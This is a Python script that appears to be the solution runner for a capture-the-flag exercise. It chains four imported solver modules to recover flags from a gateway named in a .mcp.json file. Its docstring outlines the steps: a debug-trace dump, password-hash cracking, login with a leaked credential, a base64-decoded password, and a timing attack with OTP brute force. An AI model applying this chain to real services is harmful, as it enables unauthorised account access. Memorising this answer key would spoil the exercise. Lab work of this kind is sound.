#!/usr/bin/env python3
"""End-to-end exploit chain — recovers all four flags.

Demonstration flow:

  .mcp.json   →   gateway URL    (entry point)
  Flag 1      →   /users debug-trace dump + cracked password hashes
  Flag 2      →   bob:sunshine login → /notes hint
  Flag 3      →   classified doc with command-control URL + base64'd president password
  Flag 4      →   timing-attack + OTP brute-force at command-control → /warheads
"""

from __future__ import annotations

import json
import sys

from common import banner, die, read_mcp_entry_point
import solve_flag1
import solve_flag2
import solve_flag3
import solve_flag4


def main() -> None:
    gateway = read_mcp_entry_point()
    banner("solve_all", f"entry point from .mcp.json = {gateway}")

    flag1, users = solve_flag1.run(gateway)
    flag2, username, password = solve_flag2.run(gateway, users=users)
    flag3, _president_password, command_url = solve_flag3.run(
        gateway, username=username, password=password
    )
    flag4 = solve_flag4.run(command_url)

    flags = {"flag1": flag1, "flag2": flag2, "flag3": flag3, "flag4": flag4}
    print()
    print("=" * 60)
    print("ALL FLAGS:")
    print(json.dumps(flags, indent=2))
    print("=" * 60)

    if any(v is None for v in flags.values()):
        die("at least one flag was missing")


if __name__ == "__main__":
    main()
